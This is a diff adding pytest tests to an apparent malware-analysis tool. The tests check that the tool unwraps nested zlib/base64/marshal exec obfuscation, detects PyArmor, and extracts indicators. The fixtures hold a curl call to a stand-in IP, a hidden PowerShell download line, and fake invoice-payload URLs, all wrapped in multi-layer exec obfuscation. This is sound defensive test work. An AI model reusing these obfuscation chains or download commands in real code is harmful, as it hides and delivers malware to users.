@@ -628,3 +628,54 @@ def test_dosfuscation_sample_end_to_end(client) -> None:
     assert "call powershell -w hidden -c iwr http://invoice-files.example/Factura_2024-0613.ps1" in sc["code"]
     iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
     assert "http://invoice-files.example/Factura_2024-0613.ps1" in iocs
+
+
+_PY_CORE = "import os\nos.system('curl http://198.51.100.9/x')\n"
+
+
+def test_python_exec_chains() -> None:
+    import base64
+    import lzma
+    import marshal
+    import zlib
+    from docutracex.parsers.py_layers import unwrap
+    s = _PY_CORE
+    for _ in range(6):
+        s = f"import zlib, base64\nexec(zlib.decompress(base64.b64decode({base64.b64encode(zlib.compress(s.encode()))!r})))"
+    r = unwrap(s)
+    assert r["layers"] == 6 and r["code"] == _PY_CORE
+    lam = ("_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
+           f"exec((_)({base64.b64encode(zlib.compress(_PY_CORE.encode()))[::-1]!r}))")
+    assert unwrap(lam)["code"] == _PY_CORE
+    alias = ("from base64 import b64decode as q\nd = '" + base64.b64encode(_PY_CORE.encode()).decode()
+             + "'\neval(compile(q(d).decode(), '<s>', 'exec'))")
+    assert unwrap(alias)["code"] == _PY_CORE
+    co = compile(_PY_CORE, "<x>", "exec")
+    ms = ("import marshal,lzma,base64\nexec(marshal.loads(lzma.decompress(base64.b85decode("
+          f"{base64.b85encode(lzma.compress(marshal.dumps(co))).decode()!r}))))")
+    r = unwrap(ms)
+    assert r["kind"] == "marshal" and "os.system" in r["code"] and "http://198.51.100.9/x" in r["code"]
+    # Nothing outside the decoding whitelist is evaluated.
+    assert unwrap("exec(open('x').read())")["layers"] == 0
+    assert unwrap("exec(__import__('os').popen('id').read())")["layers"] == 0
+
+
+def test_python_pyarmor_detected(tmp_path: Path) -> None:
+    from docutracex.parsers import python as P
+    f = tmp_path / "armored.py"
+    f.write_text("from pytransform import pyarmor_runtime\npyarmor_runtime()\n"
+                 "__pyarmor__(__name__, __file__, b'PYARMOR\\x00\\x00')\n")
+    res = P.analyze(f, tmp_path / "extracted", {})
+    assert "py_pyarmor" in {x["rule"] for x in res["findings"]}
+
+
+def test_exec_chain_sample_end_to_end(client) -> None:
+    import json
+    _, res = _analyze(client, "sample_exec_chain.py", _ms().exec_chain_py())
+    py = json.loads((res / "python.json").read_text())
+    rules = {f["rule"] for f in py["findings"]}
+    assert {"py_exec_layers", "py_subprocess"} <= rules
+    assert "urllib.request.urlretrieve(u, p)" in py["scripts"][0]["code"]
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert "http://invoice-sync.example/Factura_2024-0613.exe" in iocs
+    assert any("203.0.113.50" in v for v in iocs)
